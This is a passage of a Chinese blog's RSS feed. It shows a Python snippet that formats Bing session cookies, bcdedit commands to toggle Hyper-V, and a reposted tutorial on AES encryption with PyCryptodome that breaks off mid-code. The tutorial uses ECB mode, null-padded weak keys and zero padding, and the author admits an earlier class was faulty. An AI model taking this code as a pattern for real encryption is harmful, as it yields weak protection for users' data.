<span class="nb">print</span><span class="p">(</span><span class="n">cookie_test</span><span class="p">)</span>
 
<span class="n">cookie</span> <span class="o">=</span> <span class="p">[</span><span class="n">item</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">+</span> <span class="n">item</span><span class="p">[</span><span class="s2">&#34;value&#34;</span><span class="p">]</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">cookie_test</span><span class="p">]</span>
<span class="n">cookiestr</span> <span class="o">=</span> <span class="s1">&#39;; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">item</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">cookie</span><span class="p">)</span>
<span class="c1"># 整理后的cookie</span>
<span class="nb">print</span><span class="p">(</span><span class="n">cookiestr</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="未整理的cookie为">未整理的cookie为</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">[{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;SRCHD&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;AF=QBRE&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1624095919,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">False</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;SRCHUID&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;V=2&amp;GUID=0AA209DFB56549E1AABE3300BE0C055D&amp;dmnchg=1&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1624095919,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">False</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;SRCHUSR&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;DOB=20190619&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1624095919,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">False</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;_EDGE_S&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;F=1&amp;SID=1B8FEA8F99976FF11A3FE70F98B96ED0&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">None,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">True</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;_EDGE_V&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;1&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1594633519,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">True</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;MUID&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;20D548F9F8E36E4532D24579F9CD6FDF&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1594633519,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">False</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;MUIDB&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;20D548F9F8E36E4532D24579F9CD6FDF&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;cn.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">1594633519,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">True</span><span class="p">},</span> <span class="p">{</span><span class="err">&#39;name&#39;:</span> <span class="err">&#39;_SS&#39;,</span> <span class="err">&#39;value&#39;:</span> <span class="err">&#39;SID=1B8FEA8F99976FF11A3FE70F98B96ED0&amp;HV=1560937520&#39;,</span> <span class="err">&#39;path&#39;:</span> <span class="err">&#39;/&#39;,</span> <span class="err">&#39;domain&#39;:</span> <span class="err">&#39;.bing.com&#39;,</span> <span class="err">&#39;expiry&#39;:</span> <span class="err">None,</span> <span class="err">&#39;secure&#39;:</span> <span class="err">False,</span> <span class="err">&#39;httpOnly&#39;:</span> <span class="err">False</span><span class="p">}]</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="整理后的cookie为">整理后的cookie为</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">SRCHD=AF=QBRE;</span> <span class="err">SRCHUID=V=</span><span class="mi">2</span><span class="err">&amp;GUID=</span><span class="mi">0</span><span class="err">AA</span><span class="mi">209</span><span class="err">DFB</span><span class="mf">56549E1</span><span class="err">AABE</span><span class="mi">3300</span><span class="err">BE</span><span class="mi">0</span><span class="err">C</span><span class="mi">055</span><span class="err">D&amp;dmnchg=</span><span class="mi">1</span><span class="err">;</span> <span class="err">SRCHUSR=DOB=</span><span class="mi">20190619</span><span class="err">;</span> <span class="err">_EDGE_S=F=</span><span class="mi">1</span><span class="err">&amp;SID=</span><span class="mi">1</span><span class="err">B</span><span class="mi">8</span><span class="err">FEA</span><span class="mi">8</span><span class="err">F</span><span class="mi">99976</span><span class="err">FF</span><span class="mi">11</span><span class="err">A</span><span class="mi">3</span><span class="err">FE</span><span class="mi">70</span><span class="err">F</span><span class="mi">98</span><span class="err">B</span><span class="mi">96</span><span class="err">ED</span><span class="mi">0</span><span class="err">;</span> <span class="err">_EDGE_V=</span><span class="mi">1</span><span class="err">;</span> <span class="err">MUID=</span><span class="mi">20</span><span class="err">D</span><span class="mi">548</span><span class="err">F</span><span class="mi">9</span><span class="err">F</span><span class="mf">8E36</span><span class="err">E</span><span class="mi">4532</span><span class="err">D</span><span class="mi">24579</span><span class="err">F</span><span class="mi">9</span><span class="err">CD</span><span class="mi">6</span><span class="err">FDF;</span> <span class="err">MUIDB=</span><span class="mi">20</span><span class="err">D</span><span class="mi">548</span><span class="err">F</span><span class="mi">9</span><span class="err">F</span><span class="mf">8E36</span><span class="err">E</span><span class="mi">4532</span><span class="err">D</span><span class="mi">24579</span><span class="err">F</span><span class="mi">9</span><span class="err">CD</span><span class="mi">6</span><span class="err">FDF;</span> <span class="err">_SS=SID=</span><span class="mi">1</span><span class="err">B</span><span class="mi">8</span><span class="err">FEA</span><span class="mi">8</span><span class="err">F</span><span class="mi">99976</span><span class="err">FF</span><span class="mi">11</span><span class="err">A</span><span class="mi">3</span><span class="err">FE</span><span class="mi">70</span><span class="err">F</span><span class="mi">98</span><span class="err">B</span><span class="mi">96</span><span class="err">ED</span><span class="mi">0</span><span class="err">&amp;HV=</span><span class="mi">1560937520</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>Hyper-V开启关闭</title>
    <link>https://www.bysec.cn/20170801/</link>
    <pubDate>Tue, 01 Aug 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170801/</guid>
    <description><![CDATA[<h2 id="禁用">禁用</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">bcdedit /set hypervisorlaunchtype off
</code></pre></td></tr></table>
</div>
</div><h2 id="开启">开启</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">bcdedit /set hypervisorlaunchtype auto
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>python3实现AES加密</title>
    <link>https://www.bysec.cn/20170701/</link>
    <pubDate>Sat, 01 Jul 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170701/</guid>
    <description><![CDATA[<blockquote>
<p>转载自：<a href="https://blog.csdn.net/chouzhou9701/article/details/89339625" target="_blank" rel="noopener noreffer">https://blog.csdn.net/chouzhou9701/article/details/89339625</a></p>
</blockquote>
<h1 id="前言">前言</h1>
<p>这几天研究了一下 python 实现 AES 加密，有很多坑</p>
<p>AES 加密的参数及其条件
这个 AES 加密的主要坑就在于这些条件， 首先 aes 加密有一下几个参数</p>
<ol>
<li>
<p>秘钥：加密的时候用秘钥，解密的时候需要同样的秘钥才能解出来</p>
</li>
<li>
<p>明文：需要加密的参数</p>
</li>
<li>
<p>模式：aes 加密常用的有 ECB 和 CBC 模式（我只用了这两个模式，还有其他模式）</p>
</li>
<li>
<p>iv 偏移量：这个参数在 ECB 模式下不需要，在 CBC 模式下需要</p>
</li>
</ol>
<p>需要输入这些参数才能返回一个密文
下面是重点
下面说一下这几个参数的条件：</p>
<ol>
<li>
<p>秘钥：必须是16位字节或者24位字节或者32位字节（因为python3的字符串是unicode编码，需要 encode才可以转换成字节型数据）</p>
</li>
<li>
<p>明文：字节长度需要是16位的倍数</p>
</li>
</ol>
<p>下面我用python3简单的方法实现:</p>
<h2 id="简单方法">简单方法</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;1234567890123456&#39;</span> <span class="c1">#秘钥</span>
<span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;1234567890123456&#39;</span> <span class="c1">#需要加密的内容</span>
<span class="n">model</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span> <span class="c1">#定义模式</span>
<span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">model</span><span class="p">)</span> <span class="c1">#创建一个aes对象</span>

<span class="n">en_text</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="c1">#加密明文</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span>
<span class="n">en_text</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">encodebytes</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span> <span class="c1">#将返回的字节型数据转进行base64编码</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span>
<span class="n">en_text</span> <span class="o">=</span> <span class="n">en_text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span> <span class="c1">#将字节型数据转换成python中的字符串类型</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="输出">输出</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="sa">b</span><span class="s1">&#39;u|</span><span class="se">\xcd\x0c\xdc\\\x90\xea\xdb\xee\xec\xf6</span><span class="s1">8</span><span class="se">\xdd\x00\x00</span><span class="s1">&#39;</span>
<span class="sa">b</span><span class="s1">&#39;dXzNDNxckOrb7uz2ON0AAA==</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">dXzNDNxckOrb7uz2ON0AAA</span><span class="o">==</span>
</code></pre></td></tr></table>
</div>
</div><p>这里有个问题就是密钥和加密的文本内容都必须是固定的16位（根据我前面说的参数要求）</p>
<p>所以下面优化的代码（将秘钥和需要加密的文本补成对应的位数）</p>
<h2 id="优化的代码">优化的代码</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">add_to_16</span><span class="p">(</span><span class="n">par</span><span class="p">):</span>
    <span class="n">par</span> <span class="o">=</span> <span class="n">par</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#先将字符串类型数据转换成字节型数据</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">par</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="c1">#对字节型数据进行长度判断</span>
        <span class="n">par</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="c1">#如果字节型数据长度不是16倍整数就进行 补充</span>
    <span class="k">return</span> <span class="n">par</span>

<span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span> <span class="c1">#秘钥</span>
<span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> <span class="c1">#需要加密的内容</span>
<span class="n">model</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span> <span class="c1">#定义模式</span>
<span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">add_to_16</span><span class="p">(</span><span class="n">password</span><span class="p">),</span><span class="n">model</span><span class="p">)</span> <span class="c1">#创建一个aes对象</span>

<span class="n">en_text</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">add_to_16</span><span class="p">(</span><span class="n">text</span><span class="p">))</span> <span class="c1">#加密明文</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span>
<span class="n">en_text</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">encodebytes</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span> <span class="c1">#将返回的字节型数据转进行base64编码</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span>
<span class="n">en_text</span> <span class="o">=</span> <span class="n">en_text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span> <span class="c1">#将字节型数据转换成python中的字符串类型</span>
<span class="nb">print</span><span class="p">(</span><span class="n">en_text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</code></pre></td></tr></table>
</div>
</div><p>这里简单的说一下几个存在的问题</p>
<ol>
<li>
<p>其实上述代码我简单省略的进行补全到16位，而秘钥24位也是可以的，你可以自己写一个函数来进行秘钥的补全</p>
</li>
<li>
<p>为什么进行补全之前先进行 .encode() ? 首先 encode() 不加参数默认是以 utf8 编码的，另外先进行 encode 的原因是因为怕加密的文本中存在汉字，而汉字的 utf8 编码的字节长度是3（gbk对汉字的编码字节长度是2），所以为了防止补全的位数不正确，这里必须先进行转换（我看到很多别的文章先补全后进行转换的，而且还是拿空格补全的。。。）</p>
</li>
<li>
<p>不知道有没有发现，aes.encrypt() 在第一个程序中我传递的是字符串类型，第二个程序传递的是字节型数据，这个函数其实是既可以传递字符串数据类型也可以传递字节型数据的</p>
</li>
</ol>
<p>上面的程序没有解密函数，所以我对整个加密解密进行了一个类的最终封装</p>
<h2 id="最终封装">最终封装</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="k">class</span> <span class="nc">aescrypt</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">model</span><span class="p">,</span><span class="n">iv</span><span class="p">,</span><span class="n">encode_</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">encode_</span> <span class="o">=</span> <span class="n">encode_</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">=</span>  <span class="p">{</span><span class="s1">&#39;ECB&#39;</span><span class="p">:</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">,</span><span class="s1">&#39;CBC&#39;</span><span class="p">:</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">}[</span><span class="n">model</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add_16</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">model</span> <span class="o">==</span> <span class="s1">&#39;ECB&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">)</span> <span class="c1">#创建一个aes对象</span>
        <span class="k">elif</span> <span class="n">model</span> <span class="o">==</span> <span class="s1">&#39;CBC&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">,</span><span class="n">iv</span><span class="p">)</span> <span class="c1">#创建一个aes对象</span>

        <span class="c1">#这里的密钥长度必须是16、24或32，目前16位的就够用了</span>

    <span class="k">def</span> <span class="nf">add_16</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">par</span><span class="p">):</span>
        <span class="n">par</span> <span class="o">=</span> <span class="n">par</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">encode_</span><span class="p">)</span>
        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">par</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">par</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
        <span class="k">return</span> <span class="n">par</span>

    <span class="k">def</span> <span class="nf">aesencrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
        <span class="n">text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add_16</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">aes</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">encodebytes</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">encrypt_text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">aesdecrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">decodebytes</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">encode_</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">encode_</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">pr</span> <span class="o">=</span> <span class="n">aescrypt</span><span class="p">(</span><span class="s1">&#39;12345&#39;</span><span class="p">,</span><span class="s1">&#39;ECB&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;gbk&#39;</span><span class="p">)</span>
    <span class="n">en_text</span> <span class="o">=</span> <span class="n">pr</span><span class="o">.</span><span class="n">aesencrypt</span><span class="p">(</span><span class="s1">&#39;好好学习&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;密文:&#39;</span><span class="p">,</span><span class="n">en_text</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;明文:&#39;</span><span class="p">,</span><span class="n">pr</span><span class="o">.</span><span class="n">aesdecrypt</span><span class="p">(</span><span class="n">en_text</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>时隔多天, 我终于用上了以上的代码然后我发现我的代码是错误的,评论区也有指出</p>
<p>所以我又重新测试发现在ECB模式是没有问题的, 在使用CBC 模式的条件下, 不可以在类的构造函数里面构建 aes对象, 也就是说在CBC模式下 每一次加密和解密 都需要重新构建aes对象 self.aes = AES.new(self.key,self.model,iv), 否则加密和解密的结果就会不一致或者报错</p>
<p>另外就是关于 padding模式方面的问题</p>
<ul>
<li>ZeroPadding</li>
<li>PKCS7Padding</li>
<li>PKCS5Padding</li>
</ul>
<p>这几种模式的区别, 我也不从算法方面探讨了, 因为我发现当你用什么补全的时候, 解密回来的字符串里是包含补全使用的字符串的所以代码中用'\x00' 补全是没有问题的, 你用什么补全都可以(这里我用的是python,至于别的语言是不是这样我就不知道了)</p>
<p>最后一个点就是 关于base64编码的问题了,我也不知道这个是不是由于padding 模式区别导致的, 因为有的密文采用的是base64编码, 有点密文采用的是 hexstr编码, 反正无论采用什么编码,在真正加密和解密的时候是绝对会转换成 bytes类型的</p>
<p>所以我最终只做一个只是针对 bytes 的AES加密解密类</p>
<h2 id="加密解密类">加密解密类</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">class</span> <span class="nc">Aescrypt</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">model</span><span class="p">,</span><span class="n">iv</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add_16</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">=</span> <span class="n">model</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">iv</span> <span class="o">=</span> <span class="n">iv</span>

    <span class="k">def</span> <span class="nf">add_16</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">par</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">par</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
            <span class="n">par</span> <span class="o">=</span> <span class="n">par</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">par</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">par</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
        <span class="k">return</span> <span class="n">par</span>

    <span class="k">def</span> <span class="nf">aesencrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
        <span class="n">text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add_16</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
